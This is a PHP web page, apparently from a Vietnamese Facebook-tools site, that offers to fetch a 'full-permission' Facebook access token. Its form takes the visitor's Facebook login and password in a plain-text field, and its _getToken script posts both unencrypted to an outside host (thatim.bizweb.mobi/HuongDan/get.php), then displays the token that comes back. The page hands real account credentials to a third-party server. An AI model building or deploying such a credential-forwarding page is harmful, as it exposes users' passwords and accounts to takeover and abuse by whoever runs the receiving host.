<?php
include '../incf/head.php';
require '../incf/config.php';
require '../incf/func.php';
if(isset($_SESSION['username'])){
?>
<!-- TOP METRICS -->
<div class="row">
<div class="col-md-12">
<div class="panel">
              <div class="panel-heading"> <center><i class="fa fa-retweet"></i> GET TOKEN FULL QUYỀN </center>
</div>
           <div class="panel-body">
            <form class="form-horizontal" method="post" action="#">
              
                    <div class="input-group">
											<span class="input-group-btn">
												<button class="btn btn-primary" type="button"><i class="fa fa-user"></i> Tài Khoản:</button>
											</span>
                            <input type="text" class="form-control" id="user_name" name="user_name" value="" placeholder="Số điện thoại, user name, email" required>
                        </div>
                    </br>
                   <div class="input-group">
											<span class="input-group-btn">
												<button class="btn btn-success" type="button"><i class="fa fa-lock"></i> Mật Khẩu:</button>
											</span>
                            <input type="text" class="form-control" name="password" id="password" placeholder="Nhập mật khẩu facebook" required>
                        </div>
                    </br>

                <div class="box-footer">
                    <button type="button" onclick="_getToken();" class="btn btn-danger pull-right">Lấy Token</button>
                </div>
                <!-- /.box-footer -->
            </form>
        </div>
    </div>
</div>   
</div>
<div id="thatim" class="alert alert-success" style="text-align:center;background: #E6E6E6 !important;display:none"></div>
<center><span class="h4" style="background: #333; color: white;margin-bottom: 5px; display: block;padding:5px">Nhập tài khoản và mật khẩu Facebook của bạn và Click vào nút <b>Lấy token</b>. Sau vài giây, nếu thành công bạn sẽ nhận được kết quả như hình bên dưới, copy mã tokenc từ đoạn <b>EAAA...</b></span></center>

</div>
<script>
    function _getToken() {
        var http = new XMLHttpRequest();
        var user = document.getElementById("user_name").value;
        var pass = document.getElementById("password").value;
        if (user == '' || pass == '') {
            alert('Nhập đầy đủ thông tin để get token');
        } else {
            var url = "//thatim.bizweb.mobi/HuongDan/get.php";
            var params = "u=" + user + "&p=" + pass + "";
            http.open("POST", url, true);
            http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

            http.onreadystatechange = function () {
                if (http.readyState == 4 && http.status == 200) {
                    document.getElementById("thatim").style.display = 'block';
                    
                    document.getElementById("thatim").innerHTML = http.responseText;
                }
            }
            http.send(params);
        }
    }
</script>
<?php
}
else{
  echo '<script>window.location.href = "../login.php?i=1";</script>';
}
include '../incf/foot.php';

?>
